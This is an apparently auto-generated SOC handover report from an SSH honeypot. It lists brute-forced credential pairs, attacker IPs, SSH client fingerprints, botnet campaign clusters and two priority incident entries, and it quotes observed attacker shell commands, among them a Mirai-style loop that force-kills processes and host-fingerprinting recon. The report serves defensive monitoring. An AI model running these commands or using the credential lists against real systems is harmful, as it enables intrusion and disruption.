# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-28 |
| **Generated At** | 2026-07-28T17:39:34Z |
| **Shift Time** | 17:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **386** |
| Confirmed Threats | **361** |
| False Positives Filtered | **25** (6.5%) |
| Unique Attacker IPs | **128** |
| Countries of Origin | **33** |
| High Severity Cases | **245** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **141** |
| Malware Samples Analyzed | **4** HIGH · **29** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **284** |
| Unique Credential Pairs | **184** |
| Unique Usernames | **28** |
| Unique Passwords | **76** |
| Successful Auth Pairs | **240** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 47 |
| `test` | 36 |
| `hadoop` | 31 |
| `git` | 31 |
| `user` | 30 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 20 |
| `qwerty123` | 9 |
| `123654` | 8 |
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 20 |
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `` | 7 |
| `admin` | `admin` | 6 |
| `root` | `smo@@kkklss` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user` | `321` | `193.32.162.42` | 2026-07-28T12:55:09 |
| `user` | `test` | `193.32.162.42` | 2026-07-28T12:56:23 |
| `user` | `test123` | `193.32.162.42` | 2026-07-28T12:57:35 |
| `user` | `test321` | `193.32.162.42` | 2026-07-28T12:58:47 |
| `support` | `support` | `176.53.159.196` | 2026-07-28T12:58:58 |
| `root` | `debian` | `117.50.218.37` | 2026-07-28T12:59:44 |
| `user` | `password` | `193.32.162.42` | 2026-07-28T12:59:59 |
| `user` | `passwd` | `193.32.162.42` | 2026-07-28T13:01:11 |
| `user` | `pass` | `193.32.162.42` | 2026-07-28T13:02:26 |
| `user` | `P@ssw0rd` | `193.32.162.42` | 2026-07-28T13:03:39 |
| `user` | `qwe123` | `193.32.162.42` | 2026-07-28T13:04:51 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-28T13:05:07 |
| `support` | `support` | `10.0.0.73` | 2026-07-28T13:05:22 |
| `operator` | `operator2002` | `61.185.30.170` | 2026-07-28T13:05:43 |
| `operator` | `operator2002` | `181.212.174.164` | 2026-07-28T13:05:51 |
| `user` | `qwer1234` | `193.32.162.42` | 2026-07-28T13:06:04 |
| `user` | `password123` | `193.32.162.42` | 2026-07-28T13:07:16 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-28T13:07:18 |
| `oracle` | `dietpi` | `122.117.30.20` | 2026-07-28T13:07:20 |
| `oracle` | `dietpi` | `186.103.136.43` | 2026-07-28T13:07:28 |
| `user` | `qwerty123456` | `193.32.162.42` | 2026-07-28T13:08:27 |
| `operator` | `operator2002` | `111.70.17.73` | 2026-07-28T13:09:06 |
| `operator` | `operator2002` | `10.0.0.73` | 2026-07-28T13:09:29 |
| `user` | `1234qwer` | `193.32.162.42` | 2026-07-28T13:09:39 |
| `oracle` | `dietpi` | `1.247.245.61` | 2026-07-28T13:10:46 |
| `user` | `123qwe` | `193.32.162.42` | 2026-07-28T13:10:52 |
| `oracle` | `dietpi` | `10.0.0.73` | 2026-07-28T13:11:16 |
| `user` | `passpass` | `193.32.162.42` | 2026-07-28T13:12:04 |
| `user` | `pass123` | `193.32.162.42` | 2026-07-28T13:13:18 |
| `user` | `pass1234` | `193.32.162.42` | 2026-07-28T13:14:30 |
| `user` | `wasd` | `193.32.162.42` | 2026-07-28T13:15:44 |
| `user` | `qwerty` | `193.32.162.42` | 2026-07-28T13:16:58 |
| `user` | `q1w2e3` | `193.32.162.42` | 2026-07-28T13:18:09 |
| `user` | `q1w2e3r4` | `193.32.162.42` | 2026-07-28T13:19:21 |
| `administrator` | `12345678` | `10.0.0.73` | 2026-07-28T13:20:22 |
| `user` | `1q2w3e` | `193.32.162.42` | 2026-07-28T13:20:32 |
| `user` | `1q2w3e4r` | `193.32.162.42` | 2026-07-28T13:21:43 |
| `user` | `111111` | `193.32.162.42` | 2026-07-28T13:22:53 |
| `user` | `qwerty123` | `193.32.162.42` | 2026-07-28T13:24:06 |
| `user` | `123321` | `193.32.162.42` | 2026-07-28T13:25:19 |
| `user` | `321123` | `193.32.162.42` | 2026-07-28T13:26:30 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-28T13:27:18 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-28T13:27:19 |
| `user` | `p@ssw0rd` | `193.32.162.42` | 2026-07-28T13:27:44 |
| `hadoop` | `123456` | `193.32.162.42` | 2026-07-28T13:28:57 |
| `hadoop` | `654321` | `193.32.162.42` | 2026-07-28T13:30:11 |
| `hadoop` | `123` | `193.32.162.42` | 2026-07-28T13:31:23 |
| `test` | `444` | `41.214.10.178` | 2026-07-28T13:31:55 |
| `test` | `444` | `114.30.180.58` | 2026-07-28T13:32:04 |
| `hadoop` | `321` | `193.32.162.42` | 2026-07-28T13:32:35 |
| `hadoop` | `test` | `193.32.162.42` | 2026-07-28T13:33:46 |
| `hadoop` | `test123` | `193.32.162.42` | 2026-07-28T13:34:57 |
| `hadoop` | `test321` | `193.32.162.42` | 2026-07-28T13:36:08 |
| `hadoop` | `password` | `193.32.162.42` | 2026-07-28T13:37:18 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-28T13:37:54 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-28T13:37:55 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-28T13:37:58 |
| `hadoop` | `passwd` | `193.32.162.42` | 2026-07-28T13:38:28 |
| `hadoop` | `pass` | `193.32.162.42` | 2026-07-28T13:39:39 |
| `hadoop` | `P@ssw0rd` | `193.32.162.42` | 2026-07-28T13:40:52 |
| `mysql` | `123654` | `116.228.195.251` | 2026-07-28T13:41:14 |
| `mysql` | `123654` | `182.79.218.101` | 2026-07-28T13:41:23 |
| `hadoop` | `qwe123` | `193.32.162.42` | 2026-07-28T13:42:05 |
| `root` | `` | `94.154.43.88` | 2026-07-28T13:42:31 |
| `hadoop` | `qwer1234` | `193.32.162.42` | 2026-07-28T13:43:16 |
| `hadoop` | `password123` | `193.32.162.42` | 2026-07-28T13:44:29 |
| `mysql` | `123654` | `10.0.0.73` | 2026-07-28T13:45:02 |
| `hadoop` | `qwerty123456` | `193.32.162.42` | 2026-07-28T13:45:41 |
| `hadoop` | `1234qwer` | `193.32.162.42` | 2026-07-28T13:46:51 |
| `hadoop` | `123qwe` | `193.32.162.42` | 2026-07-28T13:48:01 |
| `hadoop` | `passpass` | `193.32.162.42` | 2026-07-28T13:49:12 |
| `hadoop` | `pass123` | `193.32.162.42` | 2026-07-28T13:50:21 |
| `hadoop` | `pass1234` | `193.32.162.42` | 2026-07-28T13:51:29 |
| `hadoop` | `wasd` | `193.32.162.42` | 2026-07-28T13:52:39 |
| `sandeep` | `1234` | `172.160.227.37` | 2026-07-28T13:53:02 |
| `345gs5662d34` | `345gs5662d34` | `172.160.227.37` | 2026-07-28T13:53:04 |
| `sandeep` | `3245gs5662d34` | `172.160.227.37` | 2026-07-28T13:53:05 |
| `hadoop` | `qwerty` | `193.32.162.42` | 2026-07-28T13:53:49 |
| `hadoop` | `q1w2e3` | `193.32.162.42` | 2026-07-28T13:55:01 |
| `root` | `Qaz@12345` | `103.84.236.242` | 2026-07-28T13:55:29 |
| `345gs5662d34` | `345gs5662d34` | `103.84.236.242` | 2026-07-28T13:55:34 |
| `root` | `3245gs5662d34` | `103.84.236.242` | 2026-07-28T13:55:36 |
| `hadoop` | `q1w2e3r4` | `193.32.162.42` | 2026-07-28T13:56:13 |
| `ubuntu` | `qwerty1` | `113.140.95.250` | 2026-07-28T13:56:25 |
| `hadoop` | `1q2w3e` | `193.32.162.42` | 2026-07-28T13:57:26 |
| `hadoop` | `1q2w3e4r` | `193.32.162.42` | 2026-07-28T13:58:38 |
| `hadoop` | `111111` | `193.32.162.42` | 2026-07-28T13:59:47 |
| `ubuntu` | `qwerty1` | `10.0.0.73` | 2026-07-28T14:00:21 |
| `hadoop` | `qwerty123` | `193.32.162.42` | 2026-07-28T14:00:57 |
| `hadoop` | `123321` | `193.32.162.42` | 2026-07-28T14:02:09 |
| `hadoop` | `321123` | `193.32.162.42` | 2026-07-28T14:03:18 |
| `hadoop` | `p@ssw0rd` | `193.32.162.42` | 2026-07-28T14:04:26 |
| `root` | `qwer123` | `137.255.13.19` | 2026-07-28T14:05:11 |
| `345gs5662d34` | `345gs5662d34` | `137.255.13.19` | 2026-07-28T14:05:14 |
| `root` | `3245gs5662d34` | `137.255.13.19` | 2026-07-28T14:05:15 |
| `git` | `123456` | `193.32.162.42` | 2026-07-28T14:05:34 |
| `nobody` | `8` | `201.63.52.54` | 2026-07-28T14:06:02 |
| `nobody` | `8` | `76.133.97.153` | 2026-07-28T14:06:10 |
| `git` | `654321` | `193.32.162.42` | 2026-07-28T14:06:43 |
| `git` | `123` | `193.32.162.42` | 2026-07-28T14:07:54 |
| `git` | `321` | `193.32.162.42` | 2026-07-28T14:09:07 |
| `a` | `a` | `165.232.61.133` | 2026-07-28T14:09:56 |
| `git` | `test` | `193.32.162.42` | 2026-07-28T14:10:19 |
| `git` | `test123` | `193.32.162.42` | 2026-07-28T14:11:31 |
| `ubuntu` | `ubuntu2025` | `191.193.162.238` | 2026-07-28T14:12:20 |
| `345gs5662d34` | `345gs5662d34` | `191.193.162.238` | 2026-07-28T14:12:23 |
| `ubuntu` | `3245gs5662d34` | `191.193.162.238` | 2026-07-28T14:12:24 |
| `git` | `test321` | `193.32.162.42` | 2026-07-28T14:12:42 |
| `git` | `password` | `193.32.162.42` | 2026-07-28T14:13:55 |
| `git` | `passwd` | `193.32.162.42` | 2026-07-28T14:15:03 |
| `git` | `pass` | `193.32.162.42` | 2026-07-28T14:16:12 |
| `git` | `P@ssw0rd` | `193.32.162.42` | 2026-07-28T14:17:20 |
| `git` | `qwe123` | `193.32.162.42` | 2026-07-28T14:18:29 |
| `git` | `qwer1234` | `193.32.162.42` | 2026-07-28T14:19:39 |
| `administrator` | `qwerty123` | `121.179.93.147` | 2026-07-28T14:19:39 |
| `git` | `password123` | `193.32.162.42` | 2026-07-28T14:20:51 |
| `test` | `2` | `187.8.120.90` | 2026-07-28T14:21:08 |
| `test` | `2` | `14.153.235.237` | 2026-07-28T14:21:19 |
| `git` | `qwerty123456` | `193.32.162.42` | 2026-07-28T14:22:03 |
| `administrator` | `qwerty123` | `208.96.233.67` | 2026-07-28T14:22:51 |
| `administrator` | `qwerty123` | `183.223.156.154` | 2026-07-28T14:23:05 |
| `git` | `1234qwer` | `193.32.162.42` | 2026-07-28T14:23:16 |
| `administrator` | `qwerty123` | `10.0.0.73` | 2026-07-28T14:23:17 |
| `git` | `123qwe` | `193.32.162.42` | 2026-07-28T14:24:27 |
| `test` | `2` | `182.75.197.174` | 2026-07-28T14:24:34 |
| `test` | `2` | `10.0.0.73` | 2026-07-28T14:24:58 |
| `git` | `passpass` | `193.32.162.42` | 2026-07-28T14:25:37 |
| `git` | `pass123` | `193.32.162.42` | 2026-07-28T14:26:48 |
| `git` | `pass1234` | `193.32.162.42` | 2026-07-28T14:27:58 |
| `git` | `wasd` | `193.32.162.42` | 2026-07-28T14:29:11 |
| `git` | `qwerty` | `193.32.162.42` | 2026-07-28T14:30:22 |
| `debian` | `1111` | `182.79.218.164` | 2026-07-28T14:30:34 |
| `git` | `q1w2e3` | `193.32.162.42` | 2026-07-28T14:31:33 |
| `root` | `` | `91.92.40.18` | 2026-07-28T14:32:39 |
| `git` | `q1w2e3r4` | `193.32.162.42` | 2026-07-28T14:32:44 |
| `git` | `1q2w3e` | `193.32.162.42` | 2026-07-28T14:33:50 |
| `git` | `1q2w3e4r` | `193.32.162.42` | 2026-07-28T14:34:58 |
| `git` | `111111` | `193.32.162.42` | 2026-07-28T14:36:08 |
| `admin` | `admin` | `107.173.67.180` | 2026-07-28T14:36:38 |
| `git` | `qwerty123` | `193.32.162.42` | 2026-07-28T14:37:16 |
| `git` | `123321` | `193.32.162.42` | 2026-07-28T14:38:25 |
| `git` | `321123` | `193.32.162.42` | 2026-07-28T14:39:35 |
| `git` | `p@ssw0rd` | `193.32.162.42` | 2026-07-28T14:40:48 |
| `test` | `123456` | `193.32.162.42` | 2026-07-28T14:41:59 |
| `test` | `654321` | `193.32.162.42` | 2026-07-28T14:43:14 |
| `test` | `123` | `193.32.162.42` | 2026-07-28T14:44:32 |
| `test` | `321` | `193.32.162.42` | 2026-07-28T14:45:49 |
| `test` | `test123` | `193.32.162.42` | 2026-07-28T14:47:08 |
| `guest` | `5` | `10.0.0.73` | 2026-07-28T14:48:02 |
| `test` | `test321` | `193.32.162.42` | 2026-07-28T14:48:28 |
| `administrator` | `123654` | `186.235.193.170` | 2026-07-28T14:49:04 |
| `administrator` | `123654` | `220.179.87.204` | 2026-07-28T14:49:15 |
| `administrator` | `123654` | `10.0.0.73` | 2026-07-28T14:49:32 |
| `test` | `password` | `193.32.162.42` | 2026-07-28T14:49:53 |
| `test` | `passwd` | `193.32.162.42` | 2026-07-28T14:51:13 |
| `test` | `pass` | `193.32.162.42` | 2026-07-28T14:52:30 |
| `test` | `P@ssw0rd` | `193.32.162.42` | 2026-07-28T14:53:44 |
| `test` | `qwe123` | `193.32.162.42` | 2026-07-28T14:55:01 |
| `postgres` | `123` | `221.182.185.190` | 2026-07-28T14:55:19 |
| `postgres` | `123` | `213.230.65.53` | 2026-07-28T14:55:27 |
| `test` | `qwer1234` | `193.32.162.42` | 2026-07-28T14:56:21 |
| `test` | `password123` | `193.32.162.42` | 2026-07-28T14:57:41 |
| `postgres` | `123` | `14.54.22.11` | 2026-07-28T14:58:44 |
| `test` | `qwerty123456` | `193.32.162.42` | 2026-07-28T14:58:58 |
| `test` | `1234qwer` | `193.32.162.42` | 2026-07-28T15:00:15 |
| `test` | `123qwe` | `193.32.162.42` | 2026-07-28T15:01:35 |
| `test` | `passpass` | `193.32.162.42` | 2026-07-28T15:02:55 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-28T15:03:22 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-28T15:03:22 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-28T15:03:24 |
| `test` | `pass123` | `193.32.162.42` | 2026-07-28T15:04:10 |
| `test` | `pass1234` | `193.32.162.42` | 2026-07-28T15:05:22 |
| `test` | `wasd` | `193.32.162.42` | 2026-07-28T15:06:34 |
| `test` | `qwerty` | `193.32.162.42` | 2026-07-28T15:07:47 |
| `root` | `Yj123456` | `103.146.159.173` | 2026-07-28T15:08:56 |
| `test` | `q1w2e3` | `193.32.162.42` | 2026-07-28T15:08:59 |
| `345gs5662d34` | `345gs5662d34` | `103.146.159.173` | 2026-07-28T15:09:00 |
| `root` | `3245gs5662d34` | `103.146.159.173` | 2026-07-28T15:09:02 |
| `ubuntu` | `pass` | `78.186.54.65` | 2026-07-28T15:09:02 |
| `test` | `q1w2e3r4` | `193.32.162.42` | 2026-07-28T15:10:12 |
| `test` | `1q2w3e` | `193.32.162.42` | 2026-07-28T15:11:25 |
| `test` | `1q2w3e4r` | `193.32.162.42` | 2026-07-28T15:12:38 |
| `root` | `aqswdefr` | `36.26.78.218` | 2026-07-28T15:13:33 |
| `oracle` | `qwer1234` | `220.80.223.144` | 2026-07-28T15:13:46 |
| `test` | `111111` | `193.32.162.42` | 2026-07-28T15:13:55 |
| `test` | `qwerty123` | `193.32.162.42` | 2026-07-28T15:15:15 |
| `magento` | `magento123` | `50.62.22.47` | 2026-07-28T15:15:51 |
| `345gs5662d34` | `345gs5662d34` | `50.62.22.47` | 2026-07-28T15:15:53 |
| `magento` | `3245gs5662d34` | `50.62.22.47` | 2026-07-28T15:15:54 |
| `test` | `123321` | `193.32.162.42` | 2026-07-28T15:16:38 |
| `root` | `ubuntu` | `137.255.13.53` | 2026-07-28T15:16:54 |
| `345gs5662d34` | `345gs5662d34` | `137.255.13.53` | 2026-07-28T15:16:58 |
| `root` | `3245gs5662d34` | `137.255.13.53` | 2026-07-28T15:16:59 |
| `test` | `321123` | `193.32.162.42` | 2026-07-28T15:17:58 |
| `test` | `p@ssw0rd` | `193.32.162.42` | 2026-07-28T15:19:12 |
| `debian` | `00000` | `171.217.70.151` | 2026-07-28T15:19:48 |
| `debian` | `00000` | `10.0.0.73` | 2026-07-28T15:23:36 |
| `admin` | `admin` | `145.249.109.110` | 2026-07-28T15:29:41 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-28T15:29:42 |
| `supervisor` | `supervisor2013` | `58.22.255.28` | 2026-07-28T15:33:37 |
| `supervisor` | `supervisor2013` | `61.184.128.210` | 2026-07-28T15:33:47 |
| `supervisor` | `supervisor2013` | `218.29.196.162` | 2026-07-28T15:37:04 |
| `supervisor` | `supervisor2013` | `95.79.108.51` | 2026-07-28T15:37:11 |
| `supervisor` | `supervisor2013` | `10.0.0.73` | 2026-07-28T15:37:20 |
| `pi` | `123abc` | `113.140.95.250` | 2026-07-28T15:38:21 |
| `pi` | `123abc` | `117.222.6.204` | 2026-07-28T15:38:33 |
| `pi` | `123abc` | `10.0.0.73` | 2026-07-28T15:38:41 |
| `root` | `000000` | `80.94.92.234` | 2026-07-28T15:40:53 |
| `root` | `111111` | `80.94.92.234` | 2026-07-28T15:44:03 |
| `root` | `123` | `80.94.92.234` | 2026-07-28T15:46:53 |
| `user` | `user44` | `210.0.90.82` | 2026-07-28T15:48:02 |
| `user` | `user44` | `10.0.0.73` | 2026-07-28T15:48:23 |
| `root` | `123123` | `80.94.92.234` | 2026-07-28T15:50:22 |
| `root` | `1234` | `80.94.92.234` | 2026-07-28T15:53:54 |
| `jack` | `jackjack` | `180.76.185.216` | 2026-07-28T15:55:13 |
| `345gs5662d34` | `345gs5662d34` | `180.76.185.216` | 2026-07-28T15:55:21 |
| `jack` | `3245gs5662d34` | `180.76.185.216` | 2026-07-28T15:55:23 |
| `root` | `12345` | `80.94.92.234` | 2026-07-28T15:56:49 |
| `ubnt` | `8` | `65.20.217.64` | 2026-07-28T15:59:29 |
| `pi` | `159753` | `136.56.34.147` | 2026-07-28T16:01:35 |
| `pi` | `159753` | `10.0.0.73` | 2026-07-28T16:02:05 |
| `root` | `12345678` | `80.94.92.234` | 2026-07-28T16:03:56 |
| `root` | `123456789` | `80.94.92.234` | 2026-07-28T16:06:31 |
| `root` | `AdsTaRzVPSrdpRm@A1` | `27.50.29.181` | 2026-07-28T16:08:04 |
| `centos` | `3` | `118.183.180.108` | 2026-07-28T16:09:05 |
| `root` | `1q2w3e4r` | `80.94.92.234` | 2026-07-28T16:09:54 |
| `centos` | `3` | `213.130.207.177` | 2026-07-28T16:12:15 |
| `` | `root` | `154.219.116.177` | 2026-07-28T16:12:17 |
| `centos` | `3` | `10.0.0.73` | 2026-07-28T16:12:44 |
| `root` | `654321` | `80.94.92.234` | 2026-07-28T16:13:36 |
| `root` | `P@ssw0rd` | `80.94.92.234` | 2026-07-28T16:17:14 |
| `root` | `admin` | `80.94.92.234` | 2026-07-28T16:19:59 |
| `unknown` | `888888` | `201.63.52.54` | 2026-07-28T16:22:30 |
| `unknown` | `888888` | `211.53.58.10` | 2026-07-28T16:22:44 |
| `unknown` | `888888` | `10.0.0.73` | 2026-07-28T16:26:23 |
| `oracle` | `passw0rd` | `45.170.50.2` | 2026-07-28T16:27:14 |
| `oracle` | `passw0rd` | `45.178.227.0` | 2026-07-28T16:27:21 |
| `oracle` | `passw0rd` | `10.0.0.73` | 2026-07-28T16:27:43 |
| `blank` | `44` | `49.124.153.19` | 2026-07-28T16:47:16 |
| `centos` | `333333` | `60.173.105.206` | 2026-07-28T16:48:37 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **386** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 153 |
| OpenSSH | 61 |
| libssh | 26 |
| Paramiko (Python) | 16 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 133 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 46 | 44 |
| `f555226df196...` | Mirai/variant | 25 | 9 |
| `a2de0f306611...` | Mirai/variant | 16 | 3 |
| `eff4c24daffc...` | Modern SSH client | 10 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 133 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 46 | 44 | Mirai/variant |
| `f555226df196...` | libssh | 25 | 9 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 16 | 3 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 14 | 5 | — |
| `eff4c24daffc...` | Go SSH scanner | 10 | 1 | Modern SSH client |
| `bf7dbf67fa9b...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **5** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1059.004, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1082, T1592, T1140` |
| **Recon Loader Script** | 🟡 MEDIUM | 132 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 3 | 1 | `T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo WRITABLE >/tmp/.testfile 2>&1
```
```
ls -l /tmp/.testfile 2>&1
```
```
rm -f /tmp/.testfile
```
```
cd /tmp
```
```
for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; if [ -r "$pid/maps" ]; then suspicious=true; while IFS= read -r line; do case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then kill -9 "$pid_num" 2>/dev/null; fi; fi; done;
```
Source IPs: `91.92.40.18`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
root
```
```
enable
```
```
system
```
```
sh
```
```
cat /proc/cpuinfo 2>/dev/null | head -5; uname -m 2>/dev/null; echo ENDARCH
```
Source IPs: `154.219.116.177`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.42`, `80.94.92.234`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **128** |
| Unique ASNs | **91** |
| High-Risk ASNs | **74** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 3 | HIGH |
| `AS47890` | UNMANAGED LTD | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (245)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7179d7f72563

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 12:55 |
| **Last Seen** | 2026-07-28 12:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 12:55:05` | `cowrie.session.connect` |
| `2026-07-28 12:55:06` | `cowrie.client.version` |
| `2026-07-28 12:55:06` | `cowrie.client.kex` |
| `2026-07-28 12:55:09` | `cowrie.login.success` |
| `2026-07-28 12:55:11` | `cowrie.session.params` |
| `2026-07-28 12:55:11` | `cowrie.command.input` |
| `2026-07-28 12:55:11` | `cowrie.command.input` |
| `2026-07-28 12:55:11` | `cowrie.command.input` |
| `2026-07-28 12:55:11` | `cowrie.command.input` |
| `2026-07-28 12:55:11` | `cowrie.command.input` |
| `2026-07-28 12:55:11` | `cowrie.command.success` |
| `2026-07-28 12:55:11` | `cowrie.command.input` |
| `2026-07-28 12:55:11` | `cowrie.command.input` |
| `2026-07-28 12:55:11` | `cowrie.command.input` |
| `2026-07-28 12:55:11` | `cowrie.command.input` |
| `2026-07-28 12:55:12` | `cowrie.log.closed` |
| `2026-07-28 12:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6094d6b4da2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 12:56 |
| **Last Seen** | 2026-07-28 12:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 12:56:18` | `cowrie.session.connect` |
| `2026-07-28 12:56:19` | `cowrie.client.version` |
| `2026-07-28 12:56:19` | `cowrie.client.kex` |
| `2026-07-28 12:56:23` | `cowrie.login.success` |
| `2026-07-28 12:56:25` | `cowrie.session.params` |
| `2026-07-28 12:56:25` | `cowrie.command.input` |
| `2026-07-28 12:56:25` | `cowrie.command.input` |
| `2026-07-28 12:56:25` | `cowrie.command.input` |
| `2026-07-28 12:56:25` | `cowrie.command.input` |
| `2026-07-28 12:56:25` | `cowrie.command.input` |
| `2026-07-28 12:56:25` | `cowrie.command.success` |
| `2026-07-28 12:56:25` | `cowrie.command.input` |
